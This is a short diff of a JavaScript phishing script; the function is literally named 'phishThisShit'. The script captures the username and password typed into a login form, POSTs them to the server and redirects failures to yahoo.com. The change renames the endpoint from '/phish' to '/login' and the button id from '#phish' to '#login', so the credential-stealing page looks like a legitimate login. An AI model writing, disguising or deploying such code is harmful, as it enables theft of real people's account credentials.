@@ -4,7 +4,7 @@ var phishThisShit = function() {
   console.log('Thank you.')
   $.ajax({
     type: "POST",
-    url: '/phish',
+    url: '/login',
     data: {
       username: document.querySelector('#login-username').value,
       password: document.querySelector('#login-password').value
@@ -22,4 +22,4 @@ function error() {
   window.location=('https://yahoo.com')
 }
 
-document.querySelector('#phish').addEventListener('click', phishThisShit)
+document.querySelector('#login').addEventListener('click', phishThisShit)
